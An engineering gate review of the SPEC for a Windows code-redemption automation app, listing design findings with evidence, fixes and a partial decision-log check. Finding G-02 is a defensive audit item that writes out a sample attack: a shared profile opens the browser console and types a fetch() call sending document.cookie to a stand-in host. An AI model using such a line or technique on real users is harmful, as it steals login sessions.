# SPEC v2 gate review (fresh context, 2026-11-17)

Reviewer: fresh-context gate reviewer (read-only; this is the only project file written).
Reviewed: `SPEC.md` v2 and the foundation / stubs / tests at the SPEC v2 commit (snapshot taken with
`git archive` before the groups saved their first edits; stub line numbers below refer to that commit),
`docs/requirements.md`, both critiques in `docs/review/`, the research docs where the SPEC points to them.
Method: every decision-log item checked against SPEC text and code (file:line); SPEC 2.4-2.8, 5.3-5.7 and
6.4 read line by line; small Python probes against `autopress.models` (read-only) for the keyword rule and
`combo_risk`; `tools/check_ownership.py` run (read-only).

## Summary

| Severity | Count | IDs |
|---|---|---|
| blocker | 1 | G-01 |
| major | 7 | G-02 - G-08 |
| minor | 17 | G-09 - G-25 |

Decision log: 75 items checked. 71 verified as described; 4 partial or with a side effect that breaks
something else: PX-20 (over-broad blank check, G-01), PX-09 (in-game template / verify_region not specified,
G-20), PX-28 (one persisted message without an English pair, G-14), T05 (PX-04's static-page sentence is not
in the tests and still classifies EXPIRED, G-24). Residual risks in the same class as accepted items: PX-01
(G-02), PX-13 (G-04), PX-11 (G-07), PX-14 / T14 (G-05). Full table in section C.

Requirements: every item of `docs/requirements.md` maps to SPEC sections (section D). Two are weakened:
「暫停／繼續（從下一筆接著做）」 (with the default `pause_on_user_input` every pause is a hard pause, G-07) and
「支援一個序號拆成多格輸入」 (leftover segments in boxes 2..n, G-08).

Five most important:
1. G-01 (blocker) - `looks_blank` on EVERY runner capture pauses runs on legitimately uniform regions (empty
   result area before the message, the only_new_text baseline, wait_text "disappear").
2. G-02 (major) - shared profiles can open browser DevTools (F12, Ctrl+Shift+J/I) or the address bar and type
   JavaScript into the logged-in redeem page; the import card shows no risky line.
3. G-03 (major) - forbidden-target rule checks only the profile's exe string; the runner silently re-binds to
   another window that matches the title keyword after TARGET_LOST.
4. G-05 (major) - two RunFlow owners (Codes page, Run page): no defined resume path from the Run page for a run
   started on the Codes page (T14 requires RunFlow.resume).
5. G-07 (major) - physical-input checks inside every sleep slice make every user pause a hard pause; a pause
   after submitting turns the code into REVIEW instead of letting it finish.

## A. Foundation state

* `.venv/Scripts/python.exe -m pytest -q tests/test_models.py` -> **173 passed in 0.65 s**.
* For context (not required): `tests/test_paths_storage.py tests/test_textutil_i18n.py
  tests/test_fakes_fallback.py tests/test_interfaces.py` -> 122 passed, at a moment when the groups had just
  started saving their modules (results of those files will change while the groups work).
* `tools/check_ownership.py` -> "100 rows, 91 files, 0 problems".

## B. Findings

### G-01 - blocker - Blank-capture check on every capture pauses runs on uniform regions
* Location: SPEC 2.5 (SPEC.md:181 "every capture: masked rects blanked; looks_blank -> pause CAPTURE_BLANK");
  decision PX-20 (SPEC.md:1425); `autopress/capture.py:8-10` ("the runner calls looks_blank() on EVERY
  capture and pauses"); `looks_blank(image, std_threshold=2.0)` (capture.py:65); 5.3 `wait_text` appear False
  (SPEC.md:872), `ocr_check` (SPEC.md:873); baseline read (SPEC.md:178-179).
* Problem: most runner captures are small REGIONS, not the whole client. A region is legitimately uniform in
  normal operation: an inline result area before the message appears (common on web pages: white
  background), the only_new_text baseline taken right before the submitting step (the result area is often
  empty then, for every code), a wait_text region after the text is gone (`appear=False` succeeds exactly when the
  region becomes blank), a search region before its button appears (the precondition wait_text), and a region
  mostly covered by the masked mini bar (masking fills with one colour). Each of these pauses the run with
  CAPTURE_BLANK and the misleading text 「擷取到的畫面是全黑或單色（可能是獨佔全螢幕…）」. On a page with an
  empty result label, every single code pauses before submitting.
* Evidence: the G4 end-to-end target itself is likely to trip it: the result area of
  `tools/fake_redeem_app.py` (docstring lines 9-17; its rect is published in `--info`) shows no text before
  the first submit, so a result region drawn on it makes the first baseline read uniform; the e2e list
  (SPEC.md:1229) requires only_new_text cases. PX-34 explicitly keeps
  wait_text "disappear" (SPEC.md:1439), which this rule makes impossible to finish. The critique's fix text
  (spec_critique_product.md:374) was adopted word for word without the region distinction.
* Suggested fix: run the blank check on the target's whole client area only: when a region capture looks
  blank, grab the full client rect (one more grab, tens of ms) and pause CAPTURE_BLANK only when the client is blank
  too; never treat a uniform region as blank by itself; skip the check for the baseline read and for
  wait_text with `appear=False`. Update 2.5, capture.py docstring, 8.2 (G4: "uniform result region does not
  pause; black client does").

### G-02 - major - Shared-profile safety misses browser DevTools / address-bar script entry
* Location: `autopress/models.py:588-618` (`_RISKY_COMBOS`, `combo_risk`), `models.py:1533-1560`
  (`action_lines`), `autopress/textutil.py:127-137` (`clean_text` keeps `\n` and `\t`), SPEC 2.7.7
  (SPEC.md:241-245), 6.4.2 import card (SPEC.md:1060-1064).
* Problem: "A shared profile is executable input" (2.7.7), but `combo_risk` returns (None, "") for F12,
  Ctrl+Shift+J, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+K (Firefox console), Ctrl+U, Ctrl+V and Shift+Insert.
  Docked DevTools live in the same top-level browser window, so the foreground guard passes. A profile can
  therefore press Ctrl+Shift+J and type JavaScript into the console of the user's LOGGED-IN redeem page
  (typed text is not subject to the console's paste warning), or press Ctrl+L (only a WARNING) and type a
  `javascript:` URL (browsers strip that prefix from pasted text; typed entry was not measured here). Putting `{code}` inside the script avoids the only text check ("fixed text without {code}"); a `\n`
  inside type_text acts as Enter and is not flagged either. A key step "Ctrl+V" + Enter posts the user's
  clipboard into a chat target. The import card highlights nothing, and the RunPolicy of the file
  (`stop_after_failures` 0, `pause_after_invalid` 0, `max_cooldowns` 20) is not shown at all.
* Evidence (probe on HEAD models): `combo_risk('F12')`, `('Ctrl+Shift+J')`, `('Ctrl+Shift+I')`,
  `('Ctrl+U')`, `('Ctrl+V')` all return `(None, '')`. A chrome.exe profile with steps
  [key "Ctrl+Shift+J", type_text `fetch("https://x.example/?"+document.cookie+"{code}")\n`, type_code,
  ocr_check] gives `action_lines()` with risky=False on every line and no validation issue about either step.
* Suggested fix (A1, foundation): ERROR in key steps for developer-tool and source shortcuts (F12,
  Ctrl+Shift+I/J/C/K, Ctrl+U) and for Ctrl+V / Shift+Insert; for browser targets also refuse the address-bar
  and search shortcuts (Ctrl+L, Alt+D, F6, Ctrl+K, Ctrl+E) or at least refuse a type step after them; mark
  type_text containing a line break, a tab or "javascript:" as risky (validation WARNING and highlighted in
  `action_lines`); list non-default RunPolicy values in the import card. Add these to the hostile-profile test
  (tests/test_models.py:432).

### G-03 - major - Target resolution can bind to a forbidden or unintended window
* Location: SPEC 2.5 (SPEC.md:170 "else re-find with profile.target"), 2.7.7 (SPEC.md:243); `models.py:895`
  (`exe` "" = any), `models.py:905-907` (`is_forbidden` checks the profile string only), `models.py:925-932`,
  `models.py:1882` and `1889-1895` (`exe_path` may be "", `to_target()` then has exe ""), `models.py:1592-1598`;
  `autopress/win32/windows.py:93-100` (`find_windows` filters only with `match.matches`);
  `autopress/runner/preflight.py:19-21` ("check the target rules (forbidden exe ...)" - which exe is not said).
* Problem: (a) "shells, terminals and system UI are never a target" is enforced on `profile.target.exe`
  only. A target whose exe could not be read (picker on a window whose image path is unreadable) has exe "",
  matches ANY process with that title/class, and is never forbidden - an Explorer window on a folder named like
  the title keyword, or a console titled like it, would be typed into. (b) After TARGET_LOST the runner
  re-finds `profile.target` and continues on whatever new HWND matches, silently. With the SPEC's own example
  keyword 「兌換」 (SPEC.md:1156) a different browser window whose active tab is a forum thread "…兌換碼分享"
  matches; the next code is typed and submitted there (posting codes publicly, the PX-09 concern).
* Suggested fix: check the RESOLVED window's `exe_name` against FORBIDDEN_TARGET_EXES in `find_windows`,
  preflight, the runner's re-find and the picker; make an empty exe a validation ERROR for running (or require
  class + exact title); after TARGET_LOST re-bind automatically only to a single match with the same exe and
  title rule, otherwise pause TARGET_LOST showing the candidate window, so the user confirms with 繼續.

### G-04 - major - A browser tab change inside one code is not detected
* Location: SPEC 2.5 (SPEC.md:171, title checked once per code), 2.7.1 (SPEC.md:226-230), 2.7.7
  (SPEC.md:243-244 "the title is re-checked before every code"); `autopress/win32/input.py:83-90`
  (`InjectGuard.check` compares HWNDs / pids only).
* Problem: a browser window keeps its HWND when the active tab changes. Between the per-code title check and
  the last input of that code (several seconds: clicks, typing, submit, close-popup click_text), a
  page-initiated tab switch (a link or form with target=_blank, a popup tab) or a user tab switch with
  `pause_on_user_input` off is invisible to the guard; the remaining keystrokes and clicks go to the other tab.
  This is the "never type into the wrong window" invariant for the most common target type.
* Suggested fix: for targets with a title rule (always for browsers), check
  `profile.target.matches(exe, current title, class)` immediately before every input-sending step (one
  GetWindowTextW), or give InjectGuard an optional title predicate evaluated in `check()`; a mismatch is a
  hard pause TITLE_CHANGED with the usual PENDING / REVIEW rule.

### G-05 - major - Two RunFlow owners; no defined resume path for a run started on the Codes page
* Location: SPEC 2.4.1 (SPEC.md:137), 6.4.1 (SPEC.md:1016-1019 page-owned RunFlow on the Codes page), 6.4.3
  (SPEC.md:1074-1078 Run page 繼續 = `RunFlow.resume`), T14 (SPEC.md:1378 "resuming always goes through
  RunFlow.resume"); `autopress/ui/run_flow.py:17-18` ("Any page may own a RunFlow (Codes page and Run page
  do); an instance reacts only to the runs it started"); `autopress/ui/run_page.py` docstring.
* Problem: 開始兌換 lives mainly on the Codes page (G6), which creates its own RunFlow. An attention restores
  the main window ON THE RUN PAGE (2.4.7), whose 繼續 / 停止 must call RunFlow.resume - but the Run page's
  RunFlow did not start that run and, per the docstring, ignores it. Nothing in the SPEC (no ctx.extras key,
  no class accessor) lets the Run page reach the Codes page's instance. Likely results: a dead 繼續 button, or
  a fallback to `session.resume()` without the resume countdown and without hiding the main window (the T14
  safety behaviour). The same split affects which instance owns the mini bar, hotkeys and the summary.
* Suggested fix: exactly one RunFlow per app: e.g. G7 exposes `RunFlow.shared(ctx)` (or G5 stores one in
  `ctx.extras["run_flow"]` in `build_context`), the Codes page and the Run page both use it, and the Run page's
  attention panel / 繼續 / 停止 always act on the active run. Tell G6 and G7 now (both are implementing).

### G-06 - major - Inter-code wait and cool-down: interruptions can overwrite a finished item
* Location: SPEC 2.5 pseudo-code (SPEC.md:166-204: the `except` lines and the RATE_LIMITED / UNKNOWN /
  counter / `wait uniform(...)` lines share one indentation level); 2.3 (SPEC.md:129-134: every sleep slice
  calls `tick()`, which raises UserActivity / FailsafeTriggered); 2.2 bookkeeping (SPEC.md:121-125).
* Problem: it is not stated whether the interval wait (and the cool-down wait) run inside the per-code `try`.
  A literal reading puts them inside: a UserActivity, StopRequested or FailsafeTriggered raised while waiting
  for the next code then runs "item -> PENDING (retried after resume) or, if possibly_submitted, REVIEW" on an
  item that already reached SUCCESS / USED / INVALID (history already written), e.g. SUCCESS becomes REVIEW
  「中斷於送出後…」, and "retried after resume" re-submits a finished code. Also undefined: an item left in
  COOLDOWN when the run is stopped or paused during the cool-down (it stays 冷卻中 in the table until the next
  start), whether a pause during the cool-down keeps or restarts the remaining time, and what "retry the
  current code" means when the hard pause happened between codes.
* Suggested fix: state that the per-code `try` covers `code_started` .. final status only; the interval and
  cool-down waits run after the item is final, and an interruption there never changes that item (pause:
  continue with the next item after resume; stop: end); an item still COOLDOWN at run end becomes PENDING
  (message kept); a pause during the cool-down resumes the remaining cool-down. Add the case to 8.2 (G4).

### G-07 - major - With default settings every user pause is a hard pause (requirement weakened)
* Location: SPEC 2.3 (SPEC.md:131-134: physical-input check in every sleep slice), 2.6 (SPEC.md:209 "pause()
  ... soft: after the current code", SPEC.md:220-222 "pressing F8 or moving to the MiniBar is itself physical
  input, so a pause in the middle of a code is immediate - intended"), `autopress/runner/control.py:26-28,
  59-60`; requirements 「可暫停／繼續（從下一筆接著做）」.
* Problem: the main window is hidden during runs, so the only pause triggers are F8 and the mini bar - both
  physical input. With `pause_on_user_input` (default True) the guard always trips first, so the soft pause of
  2.6 row 1 never happens in the default configuration. A pause (or any mouse movement) during the
  post-submit phase - `ocr_check`'s initial delay and polling, `wait` steps, which send no input - aborts the
  result read and turns the code into REVIEW 「中斷於送出後，請確認是否已兌換」, so the user must check codes
  by hand that AutoPress could have read. Implementers will also be confused by the contradicting table row.
* Suggested fix: check physical input only in `InjectGuard.check` (right before an injection) and not in
  `tick()` during waits; keep the failsafe and stop checks in `tick()`. Safety is unchanged (every injection is
  still guarded: input during a wait trips at the next keystroke, before anything is sent), F8 during waits
  becomes the documented soft pause, and results are still read. Update 2.3, 2.6 and control.py.

### G-08 - major - Multi-box entry clears only the first box
* Location: SPEC 5.3 `type_code` (SPEC.md:868 "clear; split_code ...; type each segment ...; Tab between
  segments"), `models.py:1002-1009`; requirements bullet 「一個序號要拆成多格輸入」.
* Problem: `clear_first` clears once (Ctrl+A, Backspace in the focused box). Boxes 2..n keep whatever they
  held: pages commonly keep the previous code after an error, and a retried attempt after a hard pause finds
  its own partial segments. With maxlength-limited auto-advancing boxes (between = none) the new characters are
  rejected; with Tab the result depends on whether the page selects the box content. Either way a mix of two
  codes is submitted - a wasted attempt that counts towards rate limits and the invalid streak.
* Suggested fix: with split != none and `clear_first`, clear the focused box before EVERY segment (clear ->
  type segment -> Tab or auto-advance -> clear -> ...); say so in 5.3 and in `win32.input.clear_field` usage;
  add a fake-app option that pre-fills the boxes (`--prefill`) and an e2e case (8.2 G4, 8.4).

### G-09 - minor - Step tests: unsafe API default, no validation gate, guard behaviour unspecified
* Location: `autopress/runner/engine.py:141-147` (`dry_run: bool = False`), SPEC 4.3 (SPEC.md:635), 2.7.4
  (SPEC.md:236-238 "Step tests are dry runs by default"), 6.4.2 (SPEC.md:1048-1050), decision PX-27.
* Problem: the API default is a REAL test; a caller that omits the argument injects input. No rule says
  test_step refuses a step with validation ERRORs: a combo_risk ERROR key (e.g. Win+R in an imported profile)
  can be executed by a real step test, and neither the runner nor `press_combo` refuses such combos at run
  time. test_step does not say it resets the input baseline after the countdown (the click on 測試此步驟 and
  mouse movement during the countdown count as user input) or what a guard trip returns.
* Suggested fix: default `dry_run=True` (the snapshot records only that a default exists,
  `tools/interface_snapshot.py:45-50`, so test_interfaces still passes); test_step / execute_step refuse steps
  with ERROR issues and `press_combo` refuses combo_risk ERROR combos as defence in depth; reset the baseline
  at test start; a guard trip ends the test with `StepTestResult(ok=False, message=<7.1 text>)`.

### G-10 - minor - Settings changes during an active (paused) run
* Location: SPEC 6.4.5 (SPEC.md:1086-1089), `autopress/win32/hotkeys.py:46` (register replaces per action),
  `autopress/ocr/service.py:76` (restart).
* Problem: the main window is shown during decision pauses, so Settings is reachable. The hotkey conflict test
  ("temporary GlobalHotkeys.register and immediate unregister" on `ctx.hotkeys`) either unregisters the run's
  own pause / stop hotkeys (same action names) or reports 1409 "used by another program" for AutoPress's own
  registration - losing F9, the documented stop for cursor-confining games. 重新啟動引擎 or disabling OCR
  mid-run makes the next ocr_check fail after submitting (REVIEW, then stop after 3).
* Suggested fix: while `ctx.session.is_active()`, disable hotkey editing / testing and OCR restart / disable
  (with a hint), or test conflicts with a separate GlobalHotkeys instance and skip combos AutoPress holds.

### G-11 - minor - Policy evaluation order and counter semantics undefined
* Location: SPEC 2.5 (SPEC.md:194-199), `models.py:1403-1412` (RunPolicy), `models.py:460-467` (StopReason).
* Problem: implementers must guess (a) the order of the rate-limit, unknown, failure and invalid checks for one
  code (an UNKNOWN that is also the 3rd consecutive failure: pause or stop?); (b) whether resolve_attention
  (REVIEW -> SUCCESS) resets the failure counter (as written, three unknowns that the user resolves as
  SUCCESS still stop the run); (c) whether COOLDOWN is "any other final status" (resets the counters);
  (d) whether `cooldowns_used` is per run or per code and whether a success resets it; (e) the StopReason of
  `UnknownAction.STOP` (none fits).
* Suggested fix: specify; proposal: rate limit first, then unknown handling, then counters; counters use the
  status after resolve_attention; COOLDOWN neither increments nor resets; cool-downs counted per run;
  STOP -> StopReason.ERROR with the unknown-result text (or add StopReason.UNKNOWN_RESULT, A1).

### G-12 - minor - Daily cap counts manual marks
* Location: SPEC 5.6 (SPEC.md:926-927 "attempts ... counted from the history"), 5.7 (SPEC.md:951-952: 標記為已兌換
  writes a history record with run_id "manual"), 5.1 (SPEC.md:824: history written by RunSession only).
* Problem: marking 50 codes as redeemed writes 50 history records today; a daily cap of 20 then blocks every
  run with 「今天已達每日上限」. 5.1 also omits the Codes page (G6) as a history writer.
* Suggested fix: count only real attempts (run_id != "manual"); add G6's manual records to 5.1.

### G-13 - minor - verify_region comparison ignores OCR look-alikes
* Location: SPEC 5.3 type_code verify (SPEC.md:868), 7.1 (SPEC.md:1143), 5.4 (SPEC.md:895-897: 96.8-100 % of
  codes contain a look-alike), no_verify hint (SPEC.md:1169).
* Problem: the case-folded OCR text must contain the code; one 0/O or 1/I/l confusion in the input box font
  fails the code with 「輸入內容與序號不符」 (FAILED, then stop after 3) - and the preflight hint recommends adding a
  verify region. Password-style boxes always fail.
* Suggested fix: compare after folding LOOKALIKE_GROUPS (or re-read the box with `code_charset`); a
  look-alike-only difference passes; document that masked boxes cannot be verified.

### G-14 - minor - Persisted / user texts without an English pair, or in two versions
* Location: SPEC 5.3 ocr_check (SPEC.md:873: 「未讀到任何文字」 becomes the queue / history message when OCR reads
  nothing), 6.1 (SPEC.md:986-987: every persisted message has an English pair in the SPEC or a docstring),
  5.3 click_text (SPEC.md:867: short 「找不到文字「{text}」」 and the log 「沒有出現「{text}」，略過這一步」) vs 7.1
  (SPEC.md:1142 long text). Related to decision PX-28 (partial).
* Suggested fix: add 7.1 rows for 「未讀到任何文字」 / "No text was read" and the continue log line; state that
  the 7.1 long text is the StepError message.

### G-15 - minor - Region, DPI and size details
* Location: `autopress/capture.py:44-47` (grab_client has no dpi argument), SPEC 5.2 (SPEC.md:847-849 "resolve
  with dpi=window_dpi(hwnd)"), `models.py:711-728` (ClientRegion has no anchor), 7.2 size_changed text
  (SPEC.md:1186 「將依比例換算」), 2.5 start_size (SPEC.md:167, 175).
* Problem: (a) grab_client resolves regions without DPI, unlike points; (b) offset-mode regions keep only the
  top-left distance, so on a centred web form (web templates use offset, SPEC.md:847) a width change moves the
  points the user anchored 置中 but not the result / search regions; (c) the size_changed text promises ratio
  conversion, false for coord_mode offset; (d) start_size and the preflight size / DPI checks are undefined
  for a minimized target (its client rect is not the restored one).
* Suggested fix: `grab_client(..., dpi=0)` or resolve with `window_dpi` inside; give ClientRegion an anchor or
  document the limit in Help; mode-specific size_changed text; take start_size after the first successful
  bring_to_foreground and skip size / DPI preflight checks for minimized targets (as capture_blank does).

### G-16 - minor - Plan items can still be changed outside the Codes page
* Location: SPEC 5.7 (SPEC.md:958-959: read-only "in the Codes page"), 6.4.2 game rename (SPEC.md:1041-1042) ->
  `autopress/codes/queue.py:129-133` (assign_game removes duplicates), 6.4.4 requeue, 2.2 (SPEC.md:123).
* Problem: renaming the running profile's game during a pause moves or deletes plan items; when an item is gone
  its code_finished is "logged and ignored" - including the history record of a code that may have been
  redeemed, so later imports do not skip it.
* Suggested fix: block assign_game / remove for items of an active plan everywhere (or defer to run end);
  always append the history record even when the queue item is missing.

### G-17 - minor - Mini bar disabled: silent pauses; missing Settings controls
* Location: SPEC 2.4.5 / 2.4.7 (SPEC.md:147-148, 155-160), 5.6 (SPEC.md:921, 923, 926), 6.4.5 (SPEC.md:1085-1091),
  `autopress/ui/settings_page.py:1-5`.
* Problem: with `minibar_enabled` False the main window is minimized during runs, yet USER / USER_INPUT /
  FOCUS_LOST / POINT_BLOCKED pauses "stay on the MiniBar" - there is none, so the run pauses without any
  visible sign. 6.4.5 has no control for `minibar_enabled`, `save_evidence` (privacy: evidence images may show
  the account name, 6.4.6) or `ocr.enabled`.
* Suggested fix: without a bar every pause restores (or flashes) the main window; add the three switches.

### G-18 - minor - last_test_ok_at goes stale; competing profile saves
* Location: SPEC 2.4.8 (SPEC.md:162-163), 6.4.3 加入關鍵字… (SPEC.md:1077 "adds to the profile, saves it"),
  `models.py:1463`.
* Problem: a successful TEST_ONE is never invalidated, so untested_profile stays silent after steps, target
  or format change. RunFlow / the Run page save the stored profile while the Profiles page may hold a dirty
  copy that later overwrites last_test_ok_at or the new keyword.
* Suggested fix: clear last_test_ok_at when steps, target or code_format change on save; the Profiles page
  reloads (or merges these fields) on `profiles_changed`.

### G-19 - minor - History-done codes cannot be forced back into a run
* Location: SPEC 6.4.4 重新加入佇列 (SPEC.md:1083), 5.7 (SPEC.md:946-956), imports (SPEC.md:1036-1037).
* Problem: requeueing a SUCCESS / USED record is dropped by the history skip or turned SKIPPED
  「紀錄顯示已兌換過」 by the next build_plan; 取消略過 on such an item is undone the same way. The only ways out
  (delete the history record, switch the skip off) are undocumented.
* Suggested fix: an explicit requeue bypasses the history skip and marks the item so build_plan does not
  re-skip it; explain in Help.

### G-20 - minor - Template set and PX-09 detail unspecified; wizard close step vs template close step
* Location: SPEC 8.2 G8 (SPEC.md:1233), 6.4.2 wizard (SPEC.md:1055-1056), decision PX-09 (SPEC.md:1414),
  `docs/research/ux.md:153-157`.
* Problem: the SPEC never lists the built-in templates (key, steps, coord mode, preset); ux.md 5.8 and the design
  preview promise 網頁兌換（通用）, 遊戲內兌換視窗（通用）, HoYoverse 網頁兌換. PX-09 says "the in-game template
  recommends verify_region", but nothing G8 reads says so (decision partially applied). Every template already
  has a close step (8.2), yet the wizard's 「結果視窗怎麼關？」 does not say it replaces it - a literal
  implementation adds a second close step.
* Suggested fix: add a template table (or reference ux.md 5.8 explicitly) incl. the verify_region
  recommendation; the wizard replaces the template's close step.

### G-21 - minor - 10.4 contradicts itself about the R7 screenshots
* Location: SPEC 10.4 (SPEC.md:1314-1316 "demo data only (tests/fakes.py: demo_context() or a demo data
  folder)" vs SPEC.md:1322 "comes from the real app of the release build").
* Problem: tests/fakes.py is not in the build, and running / paused-with-attention / mini-bar states need a real
  run in a release build. The integration check cannot pass as written; G8 must guess.
* Suggested fix: "real AutoPress widgets of the release version with demo data (demo_context or a demo data
  folder); never design-preview or prototype images" - this still meets requirement 8.

### G-22 - minor - "Explicit click plus countdown" vs a zero countdown
* Location: SPEC 2.7.4 (SPEC.md:236), 5.6 (SPEC.md:920), `models.py:1689-1690` (countdown_s and
  resume_countdown_s accept 0), `autopress/ui/overlays.py:78-81` (0 -> done at once).
* Suggested fix: minimum 1 s for both, or reword 2.7.4.

### G-23 - minor - Shutdown when the runner does not stop within 3 s
* Location: SPEC 2.6 (SPEC.md:217), 2.8.8 (SPEC.md:268), `autopress/runner/engine.py:149-154`; compare the
  OcrService docstring (daemon thread because destroying a running QThread at exit aborts the process).
* Problem: the runner is a QThread; if the join times out (stuck in a foreign call such as AttachThreadInput),
  teardown destroys a running QThread and the process aborts. The timeout path is unspecified.
* Suggested fix: on timeout log it, save queue and history, release modifiers and exit without destroying the
  thread (keep a reference; `os._exit(0)` after the saves); RUNNING items are recovered at the next start.

### G-24 - minor - Keyword rule: PX-04's static-text sentence not covered
* Location: `tests/test_models.py:222-240` (CRITIQUE_MESSAGES), decision T05 (SPEC.md:1369 "all critique
  sentences are in tests/test_models.py"), 11.12 (SPEC.md:1349-1351 "the profile can turn only_new_text off").
* Problem: PX-04's "Enter redemption code. … Invalid or expired codes cannot be redeemed." is not tested and
  classifies EXPIRED; instruction text 「請輸入兌換碼 兌換成功後獎勵將發送至信箱」 classifies SUCCESS (probe on
  HEAD models). Only only_new_text protects against static text, and 11.12 tells users to switch it off for
  identical-message pages; a false SUCCESS is history-skipped forever.
* Suggested fix: add the sentence with its intended class; a validation WARNING when only_new_text is off
  ("the result region must contain only the result message"); optionally ignore SUCCESS hits followed by 後 /
  "after".

### G-25 - minor - Small inconsistencies
* `autopress/ui/codes_model.py:29-32` FILTERS "done" = SUCCESS, SUBMITTED, USED, while `CodeStatus.is_done`
  (`models.py:127-131`) also includes INVALID, EXPIRED, SKIPPED; 清除已完成 (SPEC.md:1032) does not say which
  set it clears.
* `autopress/ui/app.py:2` cites "SPEC section 2.6" for startup / shutdown (it is 2.8).
* SPEC 5.1 (SPEC.md:824) lists RunSession as the only history writer (see G-12).
* Suggested fix: one sentence each.

## C. Decision log verification (SPEC 12, every item)

OK = the promised change exists as described. Stub paths are `autopress/...` at the SPEC v2 commit.

| Item | Status | Evidence (file:line) | Note |
|---|---|---|---|
| T01 | OK | SPEC.md:108-112, 147-150, 229-230, 248, 873, 1103-1105; runner/engine.py:130-135; ocr/imageio.py:58-64; win32/windows.py:38-44; win32/input.py:46-49; ui/minibar.py:8-14, 50-56; models.py:1054, 1230-1232, 1504-1505 | blank-check side effect: G-01 |
| T02 | OK | SPEC.md:255-257, 270, 1258-1259; ui/app.py:25-30; ui/main_window.py:20 | |
| T03 | OK | paths.py:122-133, 151-182; tests/test_paths_storage.py:107-133 (two threads) | |
| T04 | OK | models.py:660-684; win32/input.py:167-172; tests/test_models.py:501-513 | |
| T05 | OK (T05 part) | models.py:1261-1381; tests/test_models.py:222-247 (all six T05 sentences) | PX-04 static sentence missing: G-24 |
| T06 | OK | storage.py:108-143, 235-246; tests/test_paths_storage.py:73 | |
| T07 | OK | storage.py:70-95; tests/test_paths_storage.py:86-104 | |
| T08 | OK | codes/history.py:29; tests/fakes.py:294; snapshot | |
| T09 | OK | ocr/service.py:76; context.py:9-10; tests/fakes.py:392; SPEC.md:106-107, 338-339 | see G-10 (restart mid-run) |
| T10 | OK | codes/normalize.py:35-48; SPEC.md:868, 891-893, 1226, 1229; tools/fake_redeem_app.py:10 | multi-box clearing: G-08 |
| T11 | OK | ui/codes_page.py:8-10; SPEC.md:1016-1019, 1231 | two RunFlow owners: G-05 |
| T12 | OK | SPEC.md:1214-1216; win32/hotkeys.py:10-14 | |
| T13 | OK | SPEC.md:875-877; models.py:1675, 1790; ui/ocr_review.py:8 | |
| T14 | OK | SPEC.md:159-160, 212; ui/run_flow.py:48-53; runner/engine.py:111-119 | Run-page path undefined: G-05 |
| T15 | OK | see PX-01 | residual: G-02 |
| T16 | OK | ocr/engine.py:4-8; SPEC.md:867, 1227, 1354-1355 | value UNVERIFIED by design |
| T17 | OK | ocr/engine.py:13-16 | |
| T18 | OK | SPEC.md:104, 132-134; ocr/service.py docstring; SPEC.md:1227 | |
| T19 | OK | models.py:13-14; storage.py:17, 207-216; SPEC.md:975-977, 1051, 1175; tests/test_paths_storage.py:191 | |
| T20 | OK | models.py:704-705, 727, 2142-2148; tests/test_models.py:475 | |
| T21 | OK | models.py:75-78, 1708-1710, 2212-2214; tests/test_models.py:490 | |
| T22 | OK | paths.py:155-182; SPEC.md:261, 830, 1151 | |
| T23 | OK | storage.py:235-260 | |
| T24 | OK | tools/interface_snapshot.py:63-80; tests/test_interfaces.py:39-47, 144-147, 199-210 | |
| T25 | OK | SPEC.md:328; tools/check_ownership.py -> 0 problems | |
| T26 | OK | SPEC.md:226-229; win32/input.py:83-90 | |
| T27 | OK | models.py:1195-1202; ocr/textfind.py:4-10; tests/test_models.py:555 | |
| T28 | OK | SPEC.md:232-233; win32/input.py:11-12, 110-111 | |
| T29 | OK | runner/engine.py:149-154; SPEC.md:217, 268 | timeout path: G-23 |
| T30 | OK | SPEC.md:236-238, 1048-1050, 1187-1188; win32/windows.py:29-35; runner/preview.py and preflight.py docstrings | API default: G-09 |
| T31 | OK | main.py:8, 18; autopress/__main__.py:9; ui/app.py (main docstring); selftest.py:8-9 | |
| T32 | OK | win32/elevation.py:54 (docstring); SPEC.md:258-259 | |
| T33 | OK | win32/input.py:13-16, 60-62; SPEC.md:234, 1132 | |
| T34 | OK | models.py:1673; ocr/engine.py:9; SPEC.md:923-924 | |
| T35 | OK | codes/extract.py:15-17; SPEC.md:1034, 1226 | |
| T36 | OK | codes/csvexport.py:3-4 | |
| T37 | OK | codes/queue.py:118-127; SPEC.md:957-958 | |
| T38 | OK | SPEC.md:145-146, 155-158, 214-215 | |
| T39 | OK | win32/dpi.py:4 | |
| T40 | OK | SPEC.md:1024, 1069, 1096, 1174; win32/elevation.py:54 docstring | |
| T41 | OK | SPEC.md:33-35, 1304-1305; `git remote -v` shows origin | |
| PX-01 | OK | models.py:588-618, 874-882, 1533-1572, 1594-1598; storage.py:262-275; SPEC.md:241-245, 1060-1064; tests/test_models.py:432-453 | residual gaps: G-02, G-03 |
| PX-02 | OK | models.py:1734-1735; codes/queue.py:8-10, 68-78, 111-116, 123-133; runner/engine.py:83-92; SPEC.md:930-958, 1026-1028, 1181 | |
| PX-03 | OK | as T01; rejection reasoned (SPEC.md:1408) | |
| PX-04 | OK | models.py:1060-1061; SPEC.md:178-179, 873, 906-911, 1244-1245; tools/fake_redeem_app.py:16-17 | G-01 (baseline read), G-24 |
| PX-05 | OK | models.py:139, 1614-1618, 1697-1698; SPEC.md:925, 940, 1188 | |
| PX-06 | OK | models.py:1411-1412; codes/queue.py:123-127; SPEC.md:198, 1160, 1169, 1189 | |
| PX-07 | OK | SPEC.md:188-189; runner/steps.py:13-18 | |
| PX-08 | OK | models.py:988-989; SPEC.md:867, 1055-1056, 1243; tools/fake_redeem_app.py:15 | wizard vs template close step: G-20 |
| PX-09 | PARTIAL | precondition wait_text SPEC.md:1233; on_unknown warning models.py:1619-1621; Help SPEC.md:1093-1094 | "in-game template recommends verify_region" not specified anywhere: G-20 |
| PX-10 | OK | SPEC.md:231-234, 1228; win32/input.py:6-10, 141-146 | |
| PX-11 | OK | runner/engine.py:105-109; SPEC.md:209-212, 220-223; ui/minibar.py:13-14; ui/run_flow.py:10-12 | defaults make every pause hard: G-07 |
| PX-12 | OK | SPEC.md:145-146, 246-247, 1098; ui/overlays.py:78-82 | |
| PX-13 | OK | models.py:909-914, 1599-1601; SPEC.md:171, 1182-1184 | in-code tab switch: G-04 |
| PX-14 | OK | SPEC.md:123, 143-151, 155-160, 213; ui/main_window.py:42 | G-05, G-17 |
| PX-15 | OK | SPEC.md:123-125, 175, 190-193, 1144-1147 | |
| PX-16 | OK | models.py:742-805, 981; SPEC.md:843-848, 1046, 1058-1059, 1159, 1186 | G-15 |
